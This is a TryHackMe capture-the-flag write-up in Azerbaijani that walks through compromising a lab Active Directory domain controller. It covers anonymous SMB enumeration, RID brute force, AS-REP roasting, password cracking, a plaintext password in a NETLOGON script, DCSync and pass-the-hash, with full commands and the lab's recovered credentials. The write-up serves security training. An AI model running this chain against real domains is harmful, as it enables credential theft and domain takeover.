# VulnNet: Roasted — TryHackMe Writeup

**Platforma:** TryHackMe  
**Otaq:** [VulnNet: Roasted](https://tryhackme.com/room/vulnnetroasted)  
**Çətinlik:** Orta  
**OS:** Windows Server 2019 (Active Directory)  
**Tarix:** 31 Avqust 2026

---

## Hücum Zənciri

```
Nmap → SMB Enum → User Enum (lookupsid) → AS-REP Roasting → 
Hash Crack → NETLOGON (VBS script) → Evil-WinRM → DCSync → Pass-the-Hash → ROOT
```

---

## 1. Kəşfiyyat (Reconnaissance)

### Nmap Skan

```bash
nmap -sV -sC -A 10.80.136.64 -Pn
```

**Nəticə:**

| Port | Servis | Qeyd |
|------|--------|------|
| 88/tcp | Kerberos | AD autentifikasiya |
| 389/tcp | LDAP | Active Directory |
| 464/tcp | kpasswd | Kerberos şifrə |
| 593/tcp | RPC over HTTP | Windows RPC |
| 636/tcp | tcpwrapped | LDAPS |

**Müşahidə:** Port 88 (Kerberos) və 389 (LDAP) açıqdır — bu bir **Active Directory Domain Controller**-dir.

- **Domain:** `vulnnet-rst.local`
- **Host:** `WIN-2B08M1OE1M1`
- **OS:** Windows Server 2019

### /etc/hosts-a əlavə et

```bash
echo "10.80.136.64 vulnnet-rst.local" >> /etc/hosts
```

**Niyə?** Kerberos IP ilə yox, domain adı ilə işləyir. Bu əlavə olmadan sonrakı komandalar işləməyəcək.

---

## 2. SMB Enumeration

### Paylaşımları siyahıla

```bash
smbclient -L //10.80.136.64 -N
```

**`-N`** = Null session (şifrəsiz, anonim)

**Nəticə:**

```
Sharename         Type    Comment
---------         ----    -------
ADMIN$            Disk    Remote Admin
C$                Disk    Default share
IPC$              IPC     Remote IPC
NETLOGON          Disk    Logon server share
SYSVOL            Disk    Domain policy
VulnNet-Business-Anonymous   Disk   ← AÇIQDIR
VulnNet-Enterprise-Anonymous Disk   ← AÇIQDIR
```

### Anonim paylaşımları yüklə

```bash
smbclient //10.80.136.64/VulnNet-Business-Anonymous -N \
  -c "prompt OFF; recurse ON; mget *"

smbclient //10.80.136.64/VulnNet-Enterprise-Anonymous -N \
  -c "prompt OFF; recurse ON; mget *"
```

**Nəticə:** İçəridəki `.txt` fayllarında işçilərin adları var — potensial istifadəçi adları.

---

## 3. İstifadəçi Enumeration (RID Brute Force)

```bash
impacket-lookupsid anonymous@10.80.136.64 -no-pass | \
  grep "SidTypeUser" | \
  cut -d'\' -f2 | \
  cut -d' ' -f1 > users.txt
```

**Niyə lookupsid?** `IPC$` paylaşımı anonim girişə icazə verir. Bu alət hər RID nömrəsinə sorğu göndərir və cavabdan istifadəçi adlarını çıxarır.

**Tapılan istifadəçilər (`users.txt`):**

```
Administrator
Guest
krbtgt
WIN-2B08M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

---

## 4. AS-REP Roasting

```bash
impacket-GetNPUsers vulnnet-rst.local/ \
  -dc-ip 10.80.136.64 \
  -no-pass \
  -usersfile users.txt \
  -format hashcat > hash.txt
```

**Nədir bu hücum?**  
Kerberos pre-authentication deaktiv olan istifadəçilər şifrəsiz olaraq hash qaytarır. Biz həmin hash-i offline crack edə bilirik.

**Nəticə:** `t-skid` istifadəçisi üçün AS-REP hash tapıldı:

```
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:b77f2d003c3bc5191f0ed759c...
```

Hash-i təmizlə:

```bash
grep "krb5asrep" hash.txt > clean_hash.txt
```

---

## 5. Hash Crack (John the Ripper)

```bash
john --format=krb5asrep \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  clean_hash.txt
```

**Nəticə:**

```
tj072889*   ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
```

**Əldə edilən credentials:**

```
t-skid : tj072889*
```

---

## 6. NETLOGON Share — Gizli Şifrə

İndi `t-skid`-in şifrəsi ilə əvvəl bağlı olan NETLOGON-a daxil oluruq:

```bash
smbclient //10.80.136.64/NETLOGON \
  -U 'vulnnet-rst.local\t-skid%tj072889*'
```

```bash
ls
get ResetPassword.vbs
exit
```

**Niyə NETLOGON?** Adminlər domain login scriptlərini bura qoyur. Bu scriptlərdə çox vaxt şifrələr açıq mətndə yazılır.

### VBS Script analizi

```bash
cat ResetPassword.vbs
```

Kritik hissə:

```vbscript
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

**Əldə edilən credentials:**

```
a-whitehat : bNdKVkjv3RR9ht
```

**Qeyd:** `a-whitehat` — **Domain Admin** qrupunun üzvüdür!

---

## 7. Evil-WinRM — İlk Giriş

```bash
evil-winrm -i 10.80.136.64 \
  -u 'a-whitehat' \
  -p 'bNdKVkjv3RR9ht'
```

**Nədir Evil-WinRM?** Windows Remote Management protokoluna qoşulur. Linux-da SSH nədirsə, Windows-da WinRM odur. Qoşulduqda PowerShell shell verir.

### User Flag

```powershell
type C:\Users\enterprise-core-vn\Desktop\user.txt
```

**User flag əldə edildi!** ✅

---

## 8. DCSync — Bütün Hash-ləri Oğurla

```bash
impacket-secretsdump \
  vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.80.136.64
```

**Nədir DCSync?**  
Domain Controller-lər bir-biri ilə sinxronizasiya edir. Biz Domain Admin adından bu sinxronizasiya sorğusunu göndəririk — DC bütün istifadəçilərin hash-lərini qaytarır.

**Nəticə:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
```

**Administrator NTLM Hash:**

```
c2597747aa5e43022a3a3049a3c3b09d
```

---

## 9. Pass-the-Hash — Administrator

```bash
evil-winrm -i 10.80.136.64 \
  -u Administrator \
  -H 'c2597747aa5e43022a3a3049a3c3b09d'
```

**Nədir Pass-the-Hash?**  
Şifrəni crack etməyə ehtiyac yoxdur. NTLM hash-i birbaşa autentifikasiya üçün istifadə edirik — Windows fərq etmir.

**`-H`** = Şifrə əvəzinə hash ilə giriş

### Root Flag

```powershell
type C:\Users\Administrator\Desktop\system.txt
```

**Root flag əldə edildi!** ✅

---

## Nəticə

| Mərhələ | Alət | Nəticə |
|---------|------|--------|
| Port Skan | nmap | DC, domain adı tapıldı |
| SMB Enum | smbclient | Anonim paylaşımlar tapıldı |
| User Enum | lookupsid | 9 istifadəçi tapıldı |
| AS-REP Roast | GetNPUsers | t-skid hash-i tapıldı |
| Hash Crack | john | t-skid şifrəsi crack edildi |
| SMB (NETLOGON) | smbclient | a-whitehat şifrəsi tapıldı |
| İlk Giriş | evil-winrm | User flag əldə edildi |
| DCSync | secretsdump | Admin hash əldə edildi |
| Privilege Escalation | evil-winrm PTH | Root flag əldə edildi |

---

## Öyrənilən Dərslər

- **Anonim SMB girişi** həmişə yoxlanılmalıdır — daxili sənədlər istifadəçi adları aça bilər
- **AS-REP Roasting** pre-authentication deaktiv olan userləri hədəf alır
- **Scriptlərdə açıq mətn şifrələr** çox yaygın bir zəiflikdir
- **DCSync** Domain Admin səlahiyyəti ilə bütün hash-ləri əldə etməyə imkan verir
- **Pass-the-Hash** şifrə olmadan autentifikasiyaya imkan verir

---

*Writeup: VulnNet: Roasted — TryHackMe | 31 Avqust 2026*
